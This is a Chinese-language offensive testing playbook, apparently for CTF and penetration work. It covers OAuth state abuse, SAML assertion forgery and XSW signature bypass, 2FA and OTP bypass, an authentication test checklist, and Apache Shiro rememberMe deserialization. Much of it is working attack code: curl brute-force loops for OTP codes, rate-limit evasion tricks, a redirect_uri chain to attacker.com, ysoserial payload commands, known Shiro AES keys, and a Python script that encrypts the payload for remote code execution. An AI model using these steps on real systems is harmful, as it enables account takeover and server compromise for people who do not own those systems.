## [g6] OAuth2 与 SSO——OAuth 四件套：redirect_uri、state、code、token 挨个验；SAML 断言签名优先。
### [oauth-state] state 缺失与会话固定 | medium | OAuth;SSO | oauth state
> state 缺失导致 CSRF 登录、token 泄露与开放重定向串联。
#### 这个条目的作用
state 是 OAuth 授权请求与回调之间的 CSRF 令牌：应用发起授权时把 state 放进授权 URL，回调时校验原样返回的 state，防止「攻击者伪造授权请求诱导用户」的攻击。本条目讲 state 缺失/固定时能做什么——登录 CSRF、code 重放、token 泄露与开放重定向串联，从抓包到利用的完整流程。
#### 前置条件
- 一个支持 OAuth 登录（授权码或 implicit 模式）的目标
- Burp Suite 能拦截完整授权链路（授权 URL → 同意页 → 回调）
- 两个自己的测试账号（一个用于演练「攻击者」侧）
- 会看浏览器的地址栏与开发者工具
#### 第 1 步：抓全授权链路
访问应用的「使用第三方登录」，用 Burp 全程拦截，记录三段请求：
```txt
1. 授权请求:  GET /oauth/authorize?client_id=app&redirect_uri=https://t/cb&response_type=code&scope=...
2. 同意页:    用户点击「同意」后浏览器 302
3. 回调请求:  GET https://t/cb?code=xxxxx&state=yyy
```
预期结果：看到回调里带 code，以及 state（如果有）。如果回调里没有 state 参数——缺失；如果 state 每次都相同——固定，二者都可利用。
#### 第 2 步：确认 state 缺失或固定
多次发起授权请求（每次重新点击登录），对比回调 URL 中的 state 值：
```txt
state 每次都不一样        -> 正常(随机生成)
state 每次都一样          -> 固定, 攻击者可以预判
回调里没有 state 参数     -> 缺失
有 state 但服务端不校验    -> 等价缺失, 随便填都过
```
> [!tip] 有些实现 state 存在但服务端根本不校验，等于缺失，攻击者随便填任意值都能完成回调。
#### 第 3 步：登录 CSRF（账号固定攻击）
攻击者先用自己账号完成一次授权，拿到带自己 code 的回调 URL（去掉/伪造 state 部分），把这条 URL 发给受害者；受害者点击并同意后，浏览器里登录的是「攻击者的账号」，受害者之后填写的资料全部进入攻击者账号：
```txt
攻击流程
1. 攻击者账号走完授权, 复制浏览器地址栏的回调 URL
2. 删除其中 state 参数(若服务端不校验)
3. 把该 URL 发给受害者(钓鱼/社交工程)
4. 受害者点击 -> 同意 -> 浏览器登录为攻击者账号
5. 受害者填卡号/简历等敏感数据, 全部落进攻击者账号
```
预期结果：受害者浏览器显示已登录，实际身份是攻击者。用受害者视角观察页面与请求，确认数据归属。
#### 第 4 步：重放 code 验证单次性
拿到自己的一次性 code 后，换会话重放同一个 code：
```bash
# 正常换 token
curl -X POST http://t/oauth/token \
  -d 'grant_type=authorization_code&code=XXXX&client_id=app'
# 换另一个会话/另一个 client 重放同一 code, 看是否仍可换到 token
curl -X POST http://t/oauth/token \
  -d 'grant_type=authorization_code&code=XXXX&client_id=app2'
```
预期结果：重放仍能换到 token = code 单次性缺失，配合第 3 步可做完整会话固定/账号接管。
#### 第 5 步：implicit 模式 token 泄露检查
implicit 模式 token 走 URL fragment 回传：`https://t/cb#access_token=xxxx`。拿到 token 后直调 API 验证可用性：
```bash
curl -H 'Authorization: Bearer xxxx' http://t/api/userinfo
```
再查泄露面：fragment 是否被前端读 `location.hash` 后上报统计/日志、是否漏进 Referer、是否留在浏览器历史。> [!warn] fragment 不会自动发给服务端，但任何能读 location 的第三方 JS 都能拿走 token，检查页面加载的外部脚本。
#### 第 6 步：串联开放重定向做钓鱼闭环
若同站存在开放重定向，把回调变成直达攻击者页的链：
```txt
https://t/oauth/authorize?client_id=app&redirect_uri=https://t/redirect?url=https://attacker.com
受害者授权后, code 经重定向链落入攻击者手里
```
预期结果：拿到受害者的 code，换 token 即账号接管。> [!danger] 先测 redirect_uri 校验再测 state，二者叠加是最完整的接管链。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 看到了 state 参数但没反应 | 服务端可能不校验或固定值 | 改成任意值重放，成功即说明不校验 |
| 重放 code 报 invalid_grant | code 单次性正确，无重放点 | 跳过该点，转向 state/redirect 侧 |
| 受害者点击 URL 没登录 | 授权 URL 已过期 / scope 不一致 | 重新生成 URL，换新会话测试 |
| 登录 CSRF 后没抓到数据 | 后续步骤用的还是自己的会话 | 全程用受害者同款浏览器/无痕窗口重放 |
#### 实战要点
- state 就是防 CSRF 令牌，测三点：缺不缺失、固不固定、校验不校验
- 登录 CSRF 危害：把受害者「钉」进攻击者账号，后续数据全落攻击者手里
- code 单次性缺失 + state 缺失 = 教科书级会话固定
- implicit 模式的 token 在 fragment，重点查泄露面而非传输
- 每段链路都抓包：授权 URL 参数、同意页 302、回调 query 全看
- OAuth 测试顺序：redirect_uri → state → code 单次性 → token 泄露
### [sso-saml] SAML 断言伪造 | hard | SSO;SAML | saml绕过
> SAML 断言伪造、XML 签名绕过与 SSO 常见错误配置。
#### 这个条目的作用
SAML 是 SSO 的一种标准：身份提供方（IdP）签一个 XML 断言（里面写着「谁已登录、是什么角色」），服务提供方（SP）验签后信任它。漏洞几乎都出在「验签」环节：不验、验错地方、能绕过验签。本条目教你把 SAMLResponse 抓下来、解码、改身份、过验签，实现任意用户登录/提权。
#### 前置条件
- 目标使用 SAML SSO 登录（登录表单里有很大的 SAMLResponse 参数）
- Burp Suite；SAMLResponse 是 URL 编码后的 base64
- 命令行 base64 工具；看得懂基本 XML 结构
- IdP 侧两个测试账号（用户 A、用户 B）
#### 第 1 步：抓取并解码 SAMLResponse
登录时拦截表单提交，复制 SAMLResponse 参数值：
```bash
# 先 URL 解码再 base64 解码
echo '<SAMLResponse值>' | python3 -c "import sys,urllib.parse,base64; print(base64.b64decode(urllib.parse.unquote(sys.stdin.read().strip())).decode())" > resp.xml
# 格式化看结构
python3 -c "import xml.dom.minidom; print(xml.dom.minidom.parse('resp.xml').toprettyxml())"
```
预期结果：看到 `<saml:Assertion>`，里面有 NameID（用户名）、AttributeStatement（角色）、Conditions（时间/audience）。> [!tip] 若只有 `<samlp:Response>` 没有 Assertion，可能走了 artifact 模式，另抓后续请求。
#### 第 2 步：判断验签情况
看 XML 里有没有 `ds:Signature` 节点、签名在 Response 还是 Assertion 上：
```txt
无 Signature 节点        -> 大概率不验签, 直接改
有 Signature 但删除仍能过 -> 不强校验签名存在性
有 Signature 且校验严格    -> 走 XSW / 找其他配置错误
```
也可以直接做个探针：把 NameID 改成错误用户提交，若登录成功说明根本没验签。> [!tip] 判断顺序固定：先看不验签，再试删除签名，最后才上 XSW，成本从低到高。
#### 第 3 步：未验签时直接伪造身份
把 NameID 改成目标用户、Attributes 里的角色提到 admin：
```xml
<saml:NameID>admin</saml:NameID>   <!-- 目标用户名 -->
<saml:Attribute Name="role">
  <saml:AttributeValue>admin</saml:AttributeValue>
</saml:Attribute>
```
改完重新 base64 编码提交：
```bash
base64 -w 0 resp.xml
# 把输出放入 SAMLResponse 参数重新 POST 登录
```
预期结果：以 admin 身份登录成功 = 任意账号接管，最严重的一档。
#### 第 4 步：删除 Signature 节点绕过验签
若断言带签名但服务端不强校验，直接删掉整个 `ds:Signature`：
```bash
python3 -c "
import re
x=open('resp.xml').read()
x=re.sub(r'<ds:Signature.*?</ds:Signature>','',x,flags=re.S)
open('resp_nosig.xml','w').write(x)"
```
再按第 3 步改 NameID、重编码提交。预期结果：登录成功 = 验签可绕过。> [!warn] 有些实现校验签名但只校验「存在性」不校验内容，删除即绕过，这个成本最低，务必先试。
#### 第 5 步：XSW 签名包裹绕过
严格验签时用 XML 签名包裹（XSW）：把带合法签名的原断言整体塞进伪造断言的包裹结构，服务端验的是内层旧签名，用的却是外层新身份：
```xml
<Assertion ID="fake">      <!-- 服务端读身份用这层 -->
  <NameID>admin</NameID>
  <Assertion ID="orig">    <!-- 原合法签名留在内层 -->
    <ds:Signature>...</ds:Signature>
  </Assertion>
</Assertion>
```
必要时配合 ID 引用替换（把 digest 引用从原 ID 换成包裹容器 ID）。不同实现的结构不同，结合 `samltool.com` 等调试工具边改边测。预期结果：验签通过且身份为伪造值。
#### 第 6 步：检查 audience / recipient 配置错误
不改签名，找 SP 的配置缺陷：
```txt
- audience/recipient 不校验: 拿 A 站点合法断言打 B 站点
- 跨 SP 复用: 同一断言多站点通用
- 时间条件宽松: Conditions 的 NotBefore/NotOnOrAfter 范围巨大或缺失
- 密钥重复: 多个 SP 共用一个签名证书
```
拿目标自己的合法登录包，原样提交到另一个 SP 端点，能登录即 recipient 未校验。> [!danger] 跨 SP 测试前确认目标授权范围，防越权到无关站点触发真实边界问题。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 修改后报 invalid signature | 服务端在 Assertion 上做严格验签 | 放弃直改，转 XSW 包裹 |
| 删除签名后 500 | 强校验签名存在性 | 保留签名，改 payload 其他字段 |
| 提交无任何反应 | SAMLResponse 残留部分 URL 编码 | 先 URL 解码再 base64 解码 |
| 改了 NameID 登录的还是自己 | 身份由数据库映射而不是断言内容 | 改 Attributes/roles，或找用户账本接管点 |
#### 实战要点
- 先分三问再动手：验不验签、验哪里（Response/Assertion）、签名删得掉吗
- 未验签优先：只改 NameID 就能拿任意用户，改动最小
- 删除 Signature 试一次成本极低，多数 CTF/弱实现直接过
- XSW 是硬骨头，先确认内层签名确实有效再构造包裹
- 注意 NameID 的 Format（email/transient）改动可能影响匹配
- 改完必须重新 base64 且保持 URL 编码形式提交，漏一步就静默失败
## [g7] 双因素绕过——2FA 只加一道门槛，绕过集中在旁路、枚举、重放与时间窗口。
### [2fa-bypass] 双因素绕过 | medium | 2FA;MFA | 2fa绕过
> 2FA 旁路直调、验证码枚举、重放与时间窗口利用。
#### 这个条目的作用
2FA（双因素）只是在密码之后再要一个验证码的门槛。很多实现只在网关层检查「是否完成 2FA」这个标志位，接口本身不校验；验证码还可能 4-6 位可枚举、可重放。本条目按成本从低到高走完 2FA 绕过全流程。
#### 前置条件
- 目标账号能触发 2FA（短信/邮箱/TOTP 都行），已登录第一步（密码正确）
- Burp Suite；一个能收到验证码的测试账号
- 知道目标有哪些受保护资源（/dashboard /api/profile 等）
#### 第 1 步：全流程抓包建接口清单
第一次正常走完 2FA（输验证码 → 进入系统 → 访问各页面），记录：
```txt
1. 提交验证码接口:   POST /api/verify_otp
2. 校验成功后的行为: 跳转页/响应 JSON
3. 受保护资源:       /dashboard /api/profile /admin 等
4. 会话标志:         Cookie/Header/响应里有无 2fa_verified 一类字段
```
预期结果：掌握「哪些接口检查 2FA、检查标志存在哪（Cookie/响应/服务端会话）」。
#### 第 2 步：旁路直调受保护接口
绕过验证码提交，直接用当前会话访问登录后的接口：
```bash
# 密码登录后(尚未过 2FA), 直接访问受保护资源
curl -b 'session=新登录的会话' http://t/dashboard
# 不带任何 2FA 参数也试一遍
curl -b 'session=新登录的会话' http://t/api/profile
```
预期结果：直接返回数据 = 2FA 只在网关检查，绕过网关即绕过 2FA。> [!tip] 第一步永远是旁路直调：一半的 2FA 题到这步就结束了，别急着爆破。
#### 第 3 步：响应/参数篡改
校验接口的响应或参数驱动前端逻辑时直接改：
```txt
响应篡改:  {"success":false,"verified":0} -> {"success":true,"verified":1}
参数篡改:  2fa=false->true / verified=false->true / skip=0->1 / step=verify->done
Cookie 篡改: 2fa_verified=0 -> 1
```
Burp 里改完重放，看能否进入受保护页面。预期结果：篡改后能进 = 前端信任服务端响应产物，弱实现。
#### 第 4 步：验证码枚举（无次数限制时）
先确认次数限制：故意输错 10 次看是否锁定/风控。无限制再爆破：
```bash
# 4 位数字码爆破
for i in $(seq 0 9999); do
  code=$(printf '%04d' $i)
  r=$(curl -s -X POST http://t/verify -d "code=$code")
  echo "$r" | grep -qi success && echo "HIT:$code" && break
done
```
预期结果：命中即登录成功。> [!warn] 爆破前务必确认无锁定/限速，防账号被风控影响整个测试；有限制时先走第 6 步绕限速。
#### 第 5 步：重放与时间窗口
```txt
重放: 用过的验证码换会话/换请求重放, 若仍有效 = 校验状态未消费
时间窗口: 超过声称有效期(如 30s/60s)后重放旧码
跨通道: 提交短信码的接口夹带另一个未过期码
```
预期结果：旧码仍能通过 = 状态清理缺陷，见 otp-logic 条目深挖。
#### 第 6 步：限速绕过后补爆
有次数限制时先绕限速再枚举：
```txt
- X-Forwarded-For / X-Real-IP 换 IP
- 参数加随机后缀 ?code=1234&x=1 (部分实现按参数建限速键)
- 大小写/空格变体 code= 1234 / code=1234%20
- 换等价接口: /verify 与 /api/verify 限速不同
- 并发爆破: 限制按时间窗口计数时, 同一窗口内并发请求
```
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 直调被 302 回 2FA 页 | 有服务端中间件拦截 | 找未纳入拦截的接口/路径变体（大小写、加后缀） |
| 改响应没用 | 校验在服务端会话标志 | 转向并发/枚举/逻辑缺陷 |
| 爆破 5 次被锁 | 有次数锁定 | 换账号或先绕限速，别硬刚 |
| code 提交成功但登录不进 | 验证码绑定会话/设备 | 全程保持同一 session cookie 重放 |
#### 实战要点
- 顺序铁律：旁路直调 → 响应/参数篡改 → 重放 → 枚举 → 并发，成本从低到高
- 记录哪些接口真正检查 2FA，绕过点通常在漏检的接口
- 2FA 标志在 Cookie/响应里的，篡改收益最高
- 并发提交同一验证码（竞态）在 otp-logic 条目有完整打法
- 一个 2FA 绕过 = 密码 + 第二因素全部失效，危害等同任意账号登录
### [otp-logic] OTP 校验逻辑缺陷 | medium | 2FA;OTP | otp绕过
> 绕过码、空值比较、竞态重放与时间窗口等 OTP 实现缺陷。
#### 这个条目的作用
OTP（动态验证码）题的漏洞大多不在加密/随机算法，而在校验端逻辑：允许空值/固定值、弱等值比较、不校验时效、并发提交同一码、失败后状态不清理。本条目把这些缺陷按成本从低到高逐个测一遍。
#### 前置条件
- 一个 OTP 校验接口（登录 2FA / 找回密码 / 手机绑定等场景）
- Burp Suite；能触发验证码的测试账号
- bash + curl（并发测试用）
#### 第 1 步：万能码与空值测试
先测最省事的几种输入，多数弱实现直接放行：
```txt
万能码:  000000 / 123456 / 0000 / 888888 / 111111
空值:    code=(不传) / code=(空串) / code=null / code=undefined
固定值:  演示/测试环境的 000000
其它:    code=0 / code=[] / code=true
```
```bash
curl -X POST http://t/verify -d 'code='
curl -X POST http://t/verify -d 'code=000000'
curl -X POST http://t/verify -d 'code=null'
```
预期结果：任何一个返回成功 = 直接通。> [!tip] 先删参数/置空试一次，成本三秒，命中率比想象高。
#### 第 2 步：弱等值比较测试
后端用松散比较（`==`）或把输入转数字时：
```txt
code=0     (与 false / 空串弱等)
code=false
code=1e3   (科学计数法, 若非数字校验)
code[]=    (数组参数, PHP 弱比较经典)
```
逐个提交看响应差异（success/error 文案不同）判断比较方式。预期结果：code=0 通过 = 弱等值比较漏洞。
#### 第 3 步：时效与复用测试
```txt
1. 收到验证码后记录发送时间 T
2. T+1 分钟 / T+5 分钟 / 远超声称有效期后重放该码
3. 用过期码换会话重放
4. 同一码跨账号提交(如果不绑定手机号)
```
预期结果：过期码仍有效 = 时效不校验；跨会话/跨账号有效 = 复用缺陷。
#### 第 4 步：并发重放（竞态）
同一验证码多线程同时提交，校验与状态清理非原子时多个请求同时通过：
```bash
# 同一 code 并发 50 次
for i in $(seq 1 50); do
  curl -s -X POST http://t/verify -d 'code=123456' &
done; wait
```
预期结果：不止一个请求返回成功 = 竞态。再配合换 token：并发成功后各自换的 token 是否都有效。
#### 第 5 步：失败后状态清理测试
```txt
1. 用错误码提交 3 次(全部失败)
2. 再用正确码提交, 观察是否还能过
3. 正确码用过后, 再重放是否还能用
4. 失败后正确码的"有效期"是否被错误尝试消耗
```
缺陷特征：失败次数不计数（无限试）、成功后码不消费（可反复用）。预期结果：用过的码还能再用 = 校验状态未清理。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 空值报参数错误 | 前端/后端有必填校验 | 试 null/undefined/[] 及删参数变体 |
| 并发全成功但只有一个 token | 会话级只认一次成功 | 每个成功都用独立会话取 token 验证 |
| 过期码偶尔有效 | 失效时间戳有缓冲窗口 | 拉大到 5-10 分钟再测多次确认 |
| 一直 429/锁定 | 触发风控 | 换账号/换 IP 重测，记录锁定阈值 |
#### 实战要点
- 测试顺序固定：空/固定值 → 弱比较 → 重放 → 并发 → 爆破，逻辑先于爆破
- 万能码命中率高的场景：演示环境沿用 000000、生产沿用测试码
- 竞态需要有「提交接口」与「状态清理」分离才成立，多测几次确认非偶发
- 每个缺陷都要验证到「能进受保护资源」才算数，别停在接口返回
- 记录验证码是否正确绑定手机号/会话，绑定缺失可跨账号复用
## [g8] 认证逻辑总纲——认证全功能点 checklist + Shiro 特性速查，查漏神器。
### [auth-checklist] 认证功能点 Checklist | easy | 审计;Checklist | 认证清单
> 注册/登录/找回/改密/会话全功能点测试清单，覆盖认证审计。
#### 这个条目的作用
认证是系统的核心边界，功能点多且互相牵连（注册→登录→找回→改密→会话→越权）。本条目给出一张可勾选的测试清单，按功能区分块，照着打不漏项；测试前先建「接口 + 参数 + 预期权限」矩阵。
#### 前置条件
- 目标功能完整可用：注册、登录、找回密码、改密全部开放
- Burp Suite + 至少两个测试账号
- 一份记录表（本地 txt/笔记），逐项打勾
- 先全流程正常走一遍，知道业务流程长什么样再开测
#### 第 1 步：建接口矩阵
先枚举全部认证相关接口，列成矩阵：
```txt
接口              | 方法 | 参数             | 预期权限
/api/register     | POST | user,pass,role   | 匿名
/api/login        | POST | user,pass        | 匿名
/api/forgot       | POST | user             | 匿名
/api/reset        | POST | user,token,newpass | 匿名+有效token
/api/change_pwd   | POST | user,oldpass,newpass | 登录
/api/profile      | GET  | -                | 登录
```
> [!danger] 不建矩阵直接打必然漏项，越权/直调最容易漏的就是你没列进表的接口。
#### 第 2 步：注册功能点（逐项勾选）
- [ ] 注册参数可控：role/is_admin/status/vip 等字段随请求提交即生效
- [ ] 用户名接管：注册已存在用户、admin 空格变体、大小写变体
- [ ] 邮箱/手机未验证：不验证或验证可跳过（响应篡改/直调激活接口）
- [ ] 批量注册：无速率限制，大量注册打爆资源
- [ ] 响应回显敏感信息：密码、token、激活链接明文回显
#### 第 3 步：登录功能点（逐项勾选）
- [ ] 万能密码（后端拼接 SQL 时生效）
- [ ] 弱口令/默认口令（admin/admin、admin/123456 顺序测）
- [ ] 用户枚举：提示差异（用户不存在 vs 密码错误）
- [ ] 响应篡改：success:false -> true
- [ ] SID 轮换：登录前后 SessionID 是否变化
- [ ] 并发登录/会话覆盖：同一账号多处登录的行为
#### 第 4 步：找回密码功能点（逐项勾选）
- [ ] 任意用户重置：user/tel/email 参数篡改为目标
- [ ] 步骤跳级：跳过「验证码校验」直达设置新密码
- [ ] 验证码绕过：删 code 参数/万能码/旧码复用（详见验证码条目）
- [ ] Host 头注入：Host 头改攻击者域拼重置链接
- [ ] token 可预测/可爆破：MD5(时间)/4 位数字/重置链接复用
#### 第 5 步：改密功能点（逐项勾选）
- [ ] 旧密码必填性：不带 old_password 是否成功
- [ ] 越权改他人：user 参数可控改为 admin
- [ ] 改后会话清理：改密后旧 token/旧会话是否失效
- [ ] 存储方式：确认密码是明文/MD5/SHA1（源码或泄露文件）
#### 第 6 步：会话与 Cookie（逐项勾选）
- [ ] 会话固定：登录后 SID 未轮换
- [ ] 可预测 SID：时间/自增派生，可枚举
- [ ] Cookie 篡改：明文/Base64 改 uid/role
- [ ] Cookie 属性：HttpOnly/Secure/SameSite 是否缺失
- [ ] 超时与并发：过期时间不合理 / 无空闲超时
#### 第 7 步：2FA 与越权（逐项勾选）
- [ ] 2FA 旁路：直调受保护接口
- [ ] 2FA 开关参数：2fa=false / enabled=0 篡改
- [ ] 水平越权：换他人 ID 访问数据（/api/profile?uid=2）
- [ ] 垂直越权：普通用户调 admin 接口
- [ ] 接口直调：登录后接口无鉴权直接可调
#### 第 8 步：收尾与记录（逐项勾选）
- [ ] 按矩阵回填每个接口的实际权限与缺陷
- [ ] 状态机走查：步骤颠倒/跳步（注册一半去登录）
- [ ] 密码存储确认：注册后查响应/源码确认非明文
- [ ] 输出每个缺陷的触发 URL、参数、复现步骤、影响
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 测一半漏了功能点 | 没列矩阵凭感觉打 | 先枚举接口再逐格打 |
| 越权测不出 | 只测了已登录身份 | 匿名/普通/管理员三个身份各测一遍 |
| 找不回测试账号 | 注册后被风控 | 换 IP 或换账号重新注册 |
| 全绿但实际有洞 | 只测了正向流程 | 反向测：缺参/改参/重放/跳级 |
#### 实战要点
- 矩阵先行：10 分钟建表省下 1 小时盲测
- 三个身份全部测：匿名、普通用户、管理员，权限差就是洞
- 认证题 80% 在「参数可控 + 校验缺失」，先测参数篡改再测协议
- 每个功能点 3 连：正向一次、缺参一次、越权一次
- 发现新接口随时补进矩阵，清单是兜底不是上限
- 最终成果 = 接口矩阵 + 缺陷复现记录，别只留结论
### [shiro] Shiro 特性速查 | hard | Shiro;反序列化 | shiro反序列化
> Apache Shiro 反序列化与默认配置的识别与利用。
#### 这个条目的作用
Apache Shiro 用 rememberMe Cookie 存「记住我」的序列化会话对象，老版本默认 AES 密钥硬编码在源码里。密钥公开 = 任何人能伪造加密的序列化 payload，服务端解密反序列化即 RCE。本条目教识别 Shiro、确认密钥、构造 payload 到命令执行的完整链路。
#### 前置条件
- 目标用 Java（Spring 常见）写，带登录，能出网到你的 VPS/dnslog
- ysoserial.jar；装了 pycryptodome 的 python3（或直接用一键工具）
- 本地 Java 环境（生成 gadget 用）
#### 第 1 步：识别 Shiro
发一个带 rememberMe 的请求，看响应头：
```bash
curl -s -I http://t/ -H 'Cookie: rememberMe=1'
# 响应含 Set-Cookie: rememberMe=deleteMe 即为 Shiro
```
预期结果：`Set-Cookie: rememberMe=deleteMe` = Shiro 确认无疑。> [!tip] 这是最稳的特征：正常访问时 JSESSIONID 与 rememberMe 并存。
#### 第 2 步：确认版本与密钥面
```txt
版本判断: 响应头/报错信息/技术栈指纹
- 1.2.4 及更早: 硬编码默认密钥, 直接利用
- 1.4.2+: 移除默认密钥, 需爆破弱密钥(工具内置字典)
密钥是否正确的信号: 密钥错时响应 deleteMe, 密钥对且 payload 合法时行为不同(配 dnslog 观察)
```
先用工具一键探测最省事（见第 6 步），手动打则先固定目标 Java/依赖版本（决定 gadget 选型）。
#### 第 3 步：生成 gadget payload
用 ysoserial 生成反序列化 payload，gadget 优先 CommonsBeanutils1（依赖少、命中率高）：
```bash
# 执行命令探测(dnslog 回显)
java -jar ysoserial.jar CommonsBeanutils1 'cmd /c ping dnslog.xxxx.ceye.io' > payload.bin
# URLDNS 只做探测不执行命令, 更安全
java -jar ysoserial.jar URLDNS 'http://dnslog.xxxx.ceye.io' > probe.bin
```
预期结果：生成了二进制 payload 文件。
#### 第 4 步：AES 加密并试默认密钥
Shiro 1.2.4 用 AES-CBC，默认密钥 `kPH+bIxk5D2deZiIxcaaaA==`：
```python
# pip install pycryptodome
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64, os
key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")   # 逐条试密钥库
iv  = os.urandom(16)
data = open("payload.bin","rb").read()
cipher = base64.b64encode(iv + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(data,16))).decode()
open("rememberMe.txt","w").write(cipher)
print("cookie:", cipher)
```
常见密钥库（密钥错了请求会 deleteMe/302）：
```txt
kPH+bIxk5D2deZiIxcaaaA==     (1.2.4 默认)
2Av2h/cgH+EPh7eNS8Gd7A==
4AvVhmFLUs0KTA3Kprsdag==
3AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
wGiHplamyXlVB11UXWol8g==
fCq+/xW488hMTCD+cmJ3aQ==
1QWLxg+NYmxraMoxAXu/Iw==
6ZmI6I2j5Y+R2aSnYPZiBQ==
5aaC5qKm5oqA5pyvAAAAAA==
```
#### 第 5 步：重放触发并验证
```bash
curl -s -o /dev/null http://t/ -H "Cookie: rememberMe=$(cat rememberMe.txt)"
# 到 dnslog 平台看是否出现解析记录
```
预期结果：dnslog 出现记录 = 反序列化执行成功。> [!warn] 别一上来就打弹 shell：先用 dnslog/ping 证明执行，再上命令执行，防 payload 不兼容打崩环境。
#### 第 6 步：工具化利用（实战推荐）
手动组装易错，实战直接用一键工具，参数：
```bash
# ShiroExploit (GUI)
java -jar ShiroExploit.jar -u "http://target/"
# shiro_attack (SummerSec/ShiroAttack2)
java -jar shiro_attack-2.2.jar -u "http://target/"
```
进入后按提示：选择密钥/爆破密钥 → 选 gadget（CommonsBeanutils1 优先）→ 填命令（先 ping dnslog）→ 执行看回显。预期结果：确认密钥 + 命令执行成功。> [!tip] 工具内置几十个历史密钥与常用 gadget 字典，识别到 Shiro 直接用工具比手打快一个量级。
#### 第 7 步：命令执行与权限落地
确认可执行后上真实命令：
```txt
Windows: cmd /c whoami /c ipconfig
Linux:   id / whoami / cat /flag
落地:    echo 输出写文件再读取, 或反弹 shell / 写后门 (仅授权靶标)
```
> [!danger] 反弹 shell / 写马属于真实破坏行为，务必在授权靶标上进行；CTF 环境优先用只读命令拿到 flag。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 一直 deleteMe | 密钥不对 / 版本 1.4.2+ | 换下一个密钥；或上工具自动爆破 |
| payload 不触发 | gadget 与目标依赖版本不匹配 | 换 commons-collections 版本链 |
| 命令执行但无回显 | payload 无回显通道 | 用 dnslog/ping 证明，输出写文件读回 |
| 请求 500 | 反序列化异常 | 换 gadget，别在同一环境反复试 |
| 没有 ysoserial | 环境受限 | 用 URLDNS 探针或工具内置生成 |
#### 实战要点
- 识别只用一招：带 rememberMe=1 的请求响应里有 deleteMe
- 1.2.4 默认密钥 kPH+bIxk5D2deZiIxcaaaA== 直接打，最省事
- 先用 URLDNS/dnslog 证明执行再上命令，防打崩环境
- gadget 优先 CommonsBeanutils1：依赖少、兼容 Java 版本广
- Shiro 题很少卡在利用，多卡在 gadget 版本匹配，多带几套链
- 拿到执行后优先只读取证（whoami/pwd/cat flag），别做破坏性操作